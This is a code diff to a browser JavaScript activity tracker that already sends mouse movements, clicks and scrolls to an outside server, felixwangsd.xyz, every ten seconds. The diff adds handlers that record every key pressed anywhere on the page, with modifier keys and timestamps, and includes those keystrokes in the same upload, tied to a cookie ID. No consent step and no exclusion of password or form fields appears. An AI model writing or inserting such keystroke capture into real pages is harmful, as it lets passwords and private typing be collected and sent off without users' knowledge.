@@ -56,9 +56,34 @@ console.log(img_enable);
 document.onmousemove = handleMouseMove;
 document.onmousedown = handleMouseClick;
 document.onscroll = handleMouseScroll;
+document.onkeydown = handleKeyDown;
+document.onkeyup = handleKeyUp;
 var mousePos = [];
 var mouseClick = [];
 var mouseScroll = [];
+var keyDown = [];
+var keyUp = [];
+function handleKeyDown(event) {
+    keyDown.push({
+        key: event.key,
+        keyCode: event.keyCode,
+        altKey: event.altKey,
+        ctrlKey: event.ctrlKey,
+        shiftKey: event.shiftKey,
+        timestamp: event.timeStamp
+      })
+}
+
+function handleKeyUp(event) {
+    keyUp.push({
+        key: event.key,
+        keyCode: event.keyCode,
+        altKey: event.altKey,
+        ctrlKey: event.ctrlKey,
+        shiftKey: event.shiftKey,
+        timestamp: event.timeStamp
+      })
+}
 
 function handleMouseClick(event) {
     var event = event || window.event;
@@ -185,7 +210,15 @@ $(document).ready(function(){
 });
     
 setInterval(function() {$.post("https://felixwangsd.xyz/api/activity",
-{ "cookieID": cookieID, "mousePos": JSON.stringify(mousePos), "mouseScroll": JSON.stringify(mouseScroll), "mouseClick": JSON.stringify(mouseClick)})
+{ 
+    "cookieID": cookieID,
+    "mousePos": JSON.stringify(mousePos),
+    "mouseScroll": JSON.stringify(mouseScroll),
+    "mouseClick": JSON.stringify(mouseClick),
+    "keyDown": JSON.stringify(keyDown),
+    "keyUp": JSON.stringify(keyUp)
+
+})
 .done(function(session) {
     mousePos = [];
     mouseScroll = [];
@@ -196,6 +229,8 @@ setInterval(function() {$.post("https://felixwangsd.xyz/api/activity",
     mousePos = [];
     mouseScroll = [];
     mouseClick = [];
+    keyDown = [];
+    keyUp = [];
 })
 }, 10000)
 
